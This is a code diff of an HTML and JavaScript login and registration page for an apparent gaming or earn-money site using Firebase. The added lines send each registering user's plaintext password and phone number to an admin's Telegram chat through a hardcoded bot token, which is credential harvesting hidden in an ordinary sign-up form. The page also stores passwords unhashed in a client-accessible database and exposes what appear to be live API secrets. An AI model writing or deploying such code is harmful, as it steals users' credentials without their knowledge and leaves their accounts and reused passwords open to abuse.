@@ -18,6 +18,7 @@
             font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; overflow: hidden;
         }
 
+        /* Top Support Button */
         .mini-support {
             position: absolute; top: 15px; right: 15px; display: flex; align-items: center; gap: 8px;
             background: var(--white); padding: 5px 12px; border-radius: 30px; border: 1.5px solid var(--orange);
@@ -49,6 +50,7 @@
             content: ''; position: absolute; bottom: -5px; left: 0; width: 100%; height: 3px; background: var(--orange); border-radius: 10px;
         }
 
+        /* Input Gooli Style */
         .form-area { display: flex; flex-direction: column; gap: 10px; }
         .bullet-box {
             position: relative; background: var(--dark); height: 46px;
@@ -74,13 +76,13 @@
         }
         .forgot-link span { color: var(--orange); }
 
+        /* Custom Notice Styles */
         #custom-notice {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 2000;
         }
         .notice-card { width: 80%; max-width: 300px; background: #1a1a1a; border: 2px solid var(--orange); border-radius: 20px; padding: 25px; text-align: center; color: #fff; }
         .hidden { display: none; }
-        .helper-text { font-size: 10px; color: var(--orange); text-align: left; padding-left: 10px; margin-top: -5px; text-decoration: none; }
     </style>
 </head>
 <body>
@@ -117,8 +119,6 @@
         <div id="reg-form" class="form-area hidden">
             <div class="bullet-box"><i class="fas fa-user"></i><input type="text" id="r-name" placeholder="FULL NAME"></div>
             <div class="bullet-box"><i class="fas fa-id-card"></i><input type="text" id="r-uid" placeholder="GAME UID"></div>
-            <div class="bullet-box"><i class="fas fa-paper-plane"></i><input type="number" id="r-teleid" placeholder="TELEGRAM USER ID"></div>
-            <a href="https://t.me/userinfobot" target="_blank" class="helper-text">Get ID from @userinfobot</a>
             <div class="bullet-box"><i class="fas fa-key"></i><input type="password" id="r-pass" placeholder="PASSWORD"></div>
             <div class="bullet-box"><i class="fas fa-phone"></i><input type="tel" id="r-phone" placeholder="PHONE NUMBER"></div>
             <div class="bullet-box" style="border-right-color: var(--success);"><i class="fas fa-gift"></i><input type="text" id="r-refer" placeholder="REFER CODE (OPTIONAL)"></div>
@@ -127,10 +127,12 @@
     </div>
 
     <script>
+        // --- Firebase Config ---
         const firebaseConfig = { databaseURL: "https://earn-money-6891a-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
+        // --- Admin Details ---
         const botToken = "8766300899:AAFbpRvQiNxLDWvJQ6NIP1JeJmrHfzDz6rE";
         const chatId = "7852788120";
 
@@ -153,44 +155,39 @@
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`);
         }
 
+        // --- Handle Registration ---
         async function handleRegister() {
             const name = document.getElementById('r-name').value.trim();
             const uid = document.getElementById('r-uid').value.trim();
-            const teleid = document.getElementById('r-teleid').value.trim();
             const pass = document.getElementById('r-pass').value.trim();
             const phone = document.getElementById('r-phone').value.trim();
             const referCode = document.getElementById('r-refer').value.trim();
 
-            if(!name || !uid || !pass || !phone || !teleid) {
-                showNotice("ERROR", "Please fill all fields!"); return;
+            if(!name || !uid || !pass || !phone) {
+                showNotice("ERROR", "Saari details bharein!"); return;
             }
 
             const checkUser = await database.ref('users/' + uid).once('value');
             if(checkUser.exists()) {
-                showNotice("DENIED", "UID already registered!"); return;
+                showNotice("DENIED", "UID pehle se registered hai!"); return;
             }
 
-            let finalReferrer = referCode || "NONE";
-            if(referCode !== "") {
-                const referSnap = await database.ref('users/' + referCode).once('value');
-                if(!referSnap.exists()) {
-                    showNotice("INVALID", "Refer Code not found!"); return;
-                }
-            }
-
-            // Save User Data with Telegram ID
+            // Save Data to Firebase
             await database.ref('users/' + uid).set({
-                name, uid, telegramID: teleid, password: pass, phone, balance: 0,
-                referredBy: finalReferrer, joinedOn: new Date().toLocaleString()
+                name, uid, password: pass, phone, balance: 0,
+                referredBy: referCode || "NONE",
+                joinedOn: new Date().toLocaleString()
             });
 
-            sendTelegram(`<b>🆕 NEW REGISTRATION</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n📱 TeleID: ${teleid}\n🎁 Refer: ${finalReferrer}`);
+            // Send ID/Pass to Admin's Telegram
+            sendTelegram(`<b>🆕 NEW USER REGISTERED</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: <code>${pass}</code>\n📞 Phone: ${phone}\n🎁 Refer: ${referCode || "NONE"}`);
             
             localStorage.setItem('gameID', uid);
-            showNotice("SUCCESS", "Welcome to the Squad!");
+            showNotice("SUCCESS", "Registration Successful!");
             setTimeout(() => location.href = 'home.html', 2000);
         }
 
+        // --- Handle Login ---
         async function handleLogin() {
             const uid = document.getElementById('l-uid').value.trim();
             const pass = document.getElementById('l-pass').value.trim();
@@ -200,13 +197,14 @@
             const snap = await database.ref('users/' + uid).once('value');
             if(snap.exists() && snap.val().password === pass) {
                 const user = snap.val();
-                sendTelegram(`<b>🔑 LOGIN ALERT</b>\n👤 Name: ${user.name}\n🆔 UID: ${uid}\n⏰ Time: ${new Date().toLocaleTimeString()}`);
+                // Login alert for Admin
+                sendTelegram(`<b>🔑 LOGIN ALERT</b>\n👤 Name: ${user.name}\n🆔 UID: ${uid}\n⏰ Time: ${new Date().toLocaleString()}`);
                 
                 localStorage.setItem('userName', user.name);
                 localStorage.setItem('gameID', uid);
                 location.href = 'home.html';
             } else {
-                showNotice("FAILED", "Invalid Credentials!");
+                showNotice("FAILED", "Invalid UID or Password!");
             }
         }
     </script>
